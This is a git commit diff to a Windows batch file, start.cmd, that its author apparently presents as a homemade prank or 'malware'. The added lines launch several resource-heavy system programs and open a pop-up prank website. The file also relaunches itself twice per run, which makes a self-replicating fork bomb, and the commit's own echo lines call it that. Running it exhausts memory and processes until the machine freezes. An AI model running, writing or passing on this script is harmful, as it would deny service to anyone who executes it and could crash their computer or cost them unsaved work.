9aed320bcf7ca585fa4364611c433f630f348bc2
Yusuf <YusufMuizzudin@outlook.com>
2026-04-03 19:02:31 +0100

    Enhance start.cmd with additional application launches
    Added multiple commands to launch various applications and processes, including resource-intensive ones.

--- start.cmd
+++ start.cmd
@@ -1,6 +1,23 @@
 @echo off
+echo Resourse Manager is laggy, let's do that!
 start resmon
+echo Task Manager takes up a lot of RAM, let's use that as well
 start taskmgr
+echo i'll use that malware thingy i made in scratch
 start chrome "%~dp0index.html"
+echo Antimalware Service Executable takes up a lot of RAM, let's do that!
+start MsMpEng
+echo Desktop Window Manager
+start dwm
+echo Pop-ups!
+start chrome "https://youareanidiot.cc/"
+echo File Explorer!
+start explorer
+echo is minecraft bedrock installled?
+start minecraft:///>nul
+echo Web view
+start msedgewebview2
+echo And loop x2 to take up more
 start cmd /k start.cmd
 start cmd /k start.cmd
+echo forkbomb over here is complete!
